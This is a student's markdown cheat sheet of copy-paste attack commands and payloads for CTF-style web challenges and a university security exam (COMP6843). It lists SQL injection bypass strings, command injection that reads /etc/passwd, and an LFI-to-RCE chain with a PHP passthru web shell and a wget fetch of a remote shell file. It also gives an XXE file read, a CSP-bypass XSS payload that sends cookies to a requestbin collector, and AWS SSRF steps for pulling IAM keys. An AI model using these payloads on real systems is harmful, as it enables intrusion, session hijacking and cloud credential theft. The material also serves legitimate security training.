# 6843 CMDS + PAYLOADS  
Copy pasta some commands + payloads for CTF-style challenges + COMP6843 final exam.

Automate your shit as much as possible because time is important + you dont have time to analyse every single request/response or do repetitive tasks.

# Index

- [Security Setup](#security-setup) 
- [Common 6843 words](#common-6843-words)  
- [Recon: Network Mapping](#recon---network-mapping)
- [Recon: Subdomain + File/Dir Bruteforcing](#recon---subdomain-&-directory-bruteforcing)
- [Authentication / Session Management](#authentication-&-session-management)

# Content

---
### Security Setup
---

**EC2 Web Server**
1. Launch HTTP server `python -m SimpleHTTPServer 80`
2. Hit it with requests / capture some admin cookies :)

**Alternatives to capture requests**
* https://requestbin.fullcontact.com/
* http://webhookinbox.com/

---
### Common 6843 words
---
Port Numbers, Directories, Subdomains, Files... be imaginative.
```
noone
sketch / sketchy
sy
carey / cry
9447 / 6841 / 6441
robots.txt
flag
```
List of /etc/{blah} files (in case some strings are blacklisted e.g. "/etc/passwd")  
`https://www.tldp.org/LDP/sag/html/etc-fs.html`

---
### Recon - Network Mapping
---

**Nslookup**
```
Reverse DNS query:
nslookup [ hostname/ip ]
```

**Nmap**  
```
Aggressive service/OS detection:
$ nmap -sV --version-intensity 5 [ hostname/ip ]

Scan all ports:
$ nmap -p- [ hostname/ip ]

Scan most common ports (fast):
$ nmap -F [ hostname/ip ]

Increase Verbosity / Debugging:
$ nmap -vv OR -dd [ hostname/ip ]
```

---
### Recon - Subdomain & Directory Bruteforcing
---

**LEVEL 1: Aquatone**
```
$ aquatone-discover --domain [ ns.agency ]            // run subdomain bruteforcing
$ cat ~/aquatone/example.com/hosts.txt                // show discovered subdomains
```
**LEVEL 2: AltDNS**
```
$ ./altdns.py -i [ input.txt ] -o [ output.txt ] -w [ wordlist.txt ] -r -s [ valid_subdomains.txt ]

-i input.txt  => list of known subdomains.
-o output.txt => contain list of altered/permuted subdomains that have been tested.
-r            => resolves each subdomain
-w wordlist.txt => list of words that you would like to permute your current subdomains with.
```
**GoBuster DNS Mode**
`$ go run main.go -m dns -u [ https://ns.agency ] -w /path/to/wordlist      // run subdomain bruteforcing`
**GoBuster Directory Mode**
`$ go run main.go -u https://ns.agency -w ~/1_RECON/_WORDLISTS/Directories_Common.wordlist    // run dir bruteforcing`

---
### Authentication & Session Management
---  

Observe:
* Cookie / Session Token values.
  * Base64 decode -> change values to admin etc. -> Base64 encode -> Profit.
* Page Source Code.
  * View Source -> Look for suspicious comments / sections in code -> Profit.

---
### Local/Remote File Inclusion
---  

STEP #1: Verify existence of LFI/LFD vulnerability.
```
domain.com/?p=somepage.txt
domain.com/?p=pagename-whatever
domain.com/?class=something&function=another 
```

STEP #2: Figure out where the logfiles are. Example locations:
```
// PHP Logfiles:
/usr/local/etc/php
/etc/php.d/*.ini
/etc/php5/cli/php.ini
/usr/local/lib/php.ini
/etc/php.ini
  
// Apache Logfiles:
/var/log/apache2/access.log
/var/log/httpd/error_log
/var/log/apache2/error.log
/var/log/httpd-error.log
```

STEP #3: Inject a payload into the logfile:

  * _PHP passthru() function_: Execute an external program and display raw output
  * Attack vectors:
     * URL query string: `example.com/?q=injectpaylod`
     * HTTP Headers: Referer header.
```
$ <?php passthru($_GET['cmd']); ?>
$ <?php passthru(['ls -l']); ?>
```

STEP #4: With command execution, use wget to upload your own files to the server:
```
$ /var/log/apache2/access.log&cmd=wget http://somedomain.com/shellfile.php
OR
$ <?php passthru(['w']); ?>
```

Another LFI / LFI->RCE Cheatsheet:  
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal

---
### SQLi
---

**Authentication Bypass**
```
admin' --
' or 1=1--
' or '1'='1
' or '1'='1 --
```
**Logic Testing**
```
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```

**Verification: Blind SQLi**
```
%' AND 1=1 AND '%'='                  // BOOLEAN: TRUE
%' AND 1=0 AND '%'='                  // BOOLEAN: FALSE
company=sap%' AND SLEEP(5) AND '%'='  // TIME-BASED
```

**Sqlmap Commands**
```
Enumerate everything:
$ python sqlmap.py -u https://internship.dev.ns.agency/secret/api/to/get/jobs/?company=sap -a --level=3

Enumerate a specific database:
$ python sqlmap.py -u [ example.com/?id=1234 ] --dump -D [ database_name ] --level=3
```

---
### Other/Advanced Injection
---

**Command Injection**
Examples:
```
http://shitesite/lol.php?path=cat%20/etc/passwd
http://roflblock/cgi-bin/userData.pl?doc=/bin/ls|
```  
Injection via. chaining:  
```
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
original_cmd_by_server || ls    // Only if the first cmd fail
```  
Execution inside another command:  
```
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)
```  

**Template Injection**


---
### XXE (XML External Entities)
---  

XXE standard:  
* NOTE: "FILe" upper/lowercase mix was to bypass firewalls
* Use a valid XML feed, otherwise it will probably fail to parse. i.e. chuck `&xxe;` in legit xml elements in the feed.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
        <!ENTITY xxe SYSTEM "FILe:%2F%2F%2Fetc/hosts" >
]>
<element>&xxe;</element>
```

XXE Out-of-Bounds attack:
```

```
---
### XSS Normal + Advanced
---
**Useful JS web API methods for XSS**  
Redirect a user/admin to your url to steal their cookies.
```
fetch()
window.onload()
document.location()
window.location.replace()
window.location.reload()
window.location.assign()
```

**CSP Bypass**  
Bypass via. JSONP API callback param:
```
Verify:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=alert('xss');//"></script>

Payload Original:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c='+document.cookie);//"></script>

Payload Step #1 => Encode x1:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%3D'%2Bdocument.cookie);//"></script>

Payload Step #2 => Encode x2:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%253D'%252Bdocument.cookie);//"></script>

Note:
- Encoding needs to be performed twice as the initial POST request to the target server will decode it once, then another round of decoding will be performed upon the target's callback to your attacker url.
```


---
### Server-Side Request Forgery
---
Summary: Attacker can make requests from a server to target its internal systems (i.e intranet) by bypassing its firewalls.


---
### Amazon Web Services SSRF
---

Confirm SSRF with `http://169.254.169.254` as the payload.

Typical Steps:
1. Find info / dump data in AWS instance.
```
http://169.254.169.254/latest/meta-data/iam/info   // Find an IAM role with access to the AWS resources.
http://169.254.169.254/latest/user-data
```
2. Find AWS Access Keys.
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]

Info retrieved should contain:
    * AccessKeyId: { access key ID }
    * SecretAccessKey: { secret access key }
    * Token { session token }
    * Expiration { expiry information }
```
4. Go to `~/.aws/credentials` and add in:
```
aws_access_key_id = ASIAJMCBEBJIIGUWFBMA
aws_secret_access_key = sU0fWBEQj2G0pWLz5phfA5qTD7Q3wg19FpAtVC4f
aws_session_token = {really long access token string}
```

5. Enumerate s3 bucket content: `aws s3 ls s3://ns.agency`  

6. Dump a flag or file content to stdout or download it
```
$ aws s3 cp s3://ns.agency/flag -    // dump to stdout
$ aws s3 cp s3://ns.agency/flag .    // download to current working dir
```

Alternatively, leak AWS Access Keys via. Local File Disclosure or similar vuln:
```
LFD => $ /docker-entrypoint.sh /init.sh ~/.aws/credentials.json
    OR $ cat ~/.aws/credentials
```

More info on AWS testing: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3

---
### REST APIs
---

**Common Findings / Things to look out for:**

Cookie / Session Token:
* Decode base64, may reveal sensitive information
* Check token expiry, token re-use, predictability.

Insecure Direct Object Referencing
* Changing ID / param values in the request to access/change/delete unintended resources.
* E.g. FB API vulnerability: `DELETE /<commend id>` to remove any user's comments.

Check for Privilege Escalation:
* Check Access Controls DELETE / PUT methods.

SQL injection / XSS
* Injection queries/javascript into requests to API endpoints.

Test request/response media types:
* `Accept` header: The media type(s) that the client tells the server it can understand.  
* `Content-Type` header: The media type(s) that the server tells the client what the response content actually is.

Rest API fuzzer (Fuzzapi):  
https://github.com/Fuzzapi/fuzzapi




